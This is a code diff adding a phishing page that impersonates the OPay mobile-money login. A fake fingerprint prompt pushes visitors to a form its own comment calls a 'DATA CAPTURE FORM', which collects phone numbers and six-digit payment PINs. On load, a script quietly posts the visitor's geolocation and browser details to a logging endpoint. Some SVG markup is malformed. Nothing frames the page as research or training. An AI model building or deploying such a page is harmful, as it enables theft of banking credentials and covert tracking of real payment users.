@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OPay - Secure Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #111111;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            overflow: hidden;
+        }
+        .opay-green { color: #00d38d; }
+        .bg-opay { background-color: #00d38d; }
+        .input-opay {
+            background: #1c1c1e;
+            border: 1px solid #2c2c2e;
+            color: white;
+            transition: border 0.3s;
+        }
+        .input-opay:focus {
+            border-color: #00d38d;
+            outline: none;
+        }
+        .fingerprint-anim {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        #nexo-sync {
+            display: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #00d38d;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center min-h-screen p-6">
+
+    <!-- HEADER LOGO -->
+    <div class="mt-12 mb-8">
+        <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org">
+            <rect width="40" height="40" rx="20" fill="#00d38d""")/>>
+            <path d="M20 10C14.4772 10 10 14.4772 10 20C10 25.5228 14.4772 30 20 30C25.5228 30 30 25.5228 30 20C30 14.4772 25.5228 10 20 10ZM20 26C16.6863 26 14 23.3137 14 20C14 16.6863 16.6863 14 20 14C23.3137 14 26 16.6863 26 20C26 23.3137 23.3137 26 20 26Z" fill="black""")/>>
+            <text x="45" y="28" fill="white" style="font-weight: 800; font-size: 24px;">OPay</text>
+        </svg>
+    </div>
+
+    <!-- MAIN FINGERPRINT UI -->
+    <div id="main-ui" class="flex flex-col items-center w-full">
+        <div class="w-20 h-20 bg-[#1c1c1e] rounded-full flex items-center justify-center mb-4 border border-[#2c2c2e]">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="#555">
+                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z""")/>>
+            </svg>
+        </div>
+        <div class="text-sm font-medium text-gray-400 mb-12 uppercase tracking-widest">Verify Identity</div>
+
+        <div class="flex flex-col items-center mb-10">
+            <div class="fingerprint-anim mb-6">
+                <svg width="70" height="70" viewBox="0 0 24 24" fill="#00d38d">
+                    <path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.67-.2-.13-.24-.04-.55.2-.68C7.82 2.51 9.84 2 12.01 2c2.12 0 3.99.47 5.57 1.39.24.14.32.45.19.69-.07.13-.2.19-.33.19zM2.51 15.48c-.12 0-.24-.03-.35-.11-.22-.16-.27-.47-.11-.69 1.14-1.57 2.7-2.8 4.62-3.66 3.47-1.55 7.15-1.71 10.37-.47 1.88.72 3.51 1.83 4.85 3.3.17.19.16.49-.03.66-.19.17-.49.16-.66-.03-1.25-1.37-2.78-2.4-4.52-3.07-3.01-1.15-6.42-1-9.66.45-1.78.79-3.23 1.94-4.3 3.41-.09.11-.21.13-.21.13zm15.42 6.54c-.11 0-.21-.03-.3-.1-.22-.15-.28-.46-.13-.68.79-1.15 1.2-2.48 1.2-3.85 0-2.23-.74-4.44-2.1-6.24-.17-.23-.13-.54.1-.71.23-.17.54-.13.71.1 1.48 1.98 2.29 4.41 2.29 6.85 0 1.54-.46 3.03-1.34 4.33-.09.13-.23.2-.4.2z""")/>>
+                </svg>
+            </div>
+            <div class="opay-green text-sm font-bold mb-8">Touch to verify Fingerprint</div>
+            <button onclick="showLogin()" class="bg-opay text-black font-extrabold px-12 py-3 rounded-full text-sm">USE PAYMENT PIN</button>
+        </div>
+
+        <div class="bg-[#1c1c1e] text-xs text-gray-400 py-3 px-6 rounded-lg border border-[#2c2c2e]">
+            🔒 Fingerprint operation canceled by user
+        </div>
+    </div>
+
+    <!-- DATA CAPTURE FORM (VERTICAL) -->
+    <div id="login-form" class="hidden w-full max-w-sm">
+        <h2 class="text-xl font-bold mb-8 text-center opay-green">Login with PIN</h2>
+        <form action="/login/opay" method="POST" class="flex flex-col gap-4">
+            <input name="user" type="tel" placeholder="Phone Number" class="input-opay p-4 rounded-xl text-lg" required>
+            <input name="pass" type="password" maxlength="6" placeholder="6-Digit Payment PIN" class="input-opay p-4 rounded-xl text-lg" required>
+            <button type="submit" class="bg-opay text-black font-bold p-4 rounded-xl mt-4 text-lg">LOGIN SECURELY</button>
+        </form>
+    </div>
+
+    <div class="fixed bottom-10 flex gap-4 text-xs font-bold text-gray-500">
+        <span class="opay-green cursor-pointer">Switch Account</span>
+        <span>|</span>
+        <span onclick="showLogin()" class="opay-green cursor-pointer">Login with Password</span>
+    </div>
+
+    <div id="nexo-sync" class="animate-pulse">[*] V8_OPAY_SYNC: ENCRYPTED_CHANNEL_ACTIVE</div>
+
+    <script>
+        function showLogin() {
+            document.getElementById('main-ui').classList.add('hidden');
+            document.getElementById('login-form').classList.remove('hidden');
+            document.getElementById('nexo-sync').style.display = 'block';
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_meta', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ ua: navigator.userAgent, loc: `${p.coords.latitude},${p.coords.longitude}` })
+                    });
+                });
+            }
+        };
+    </script>
+</body>
+</html>
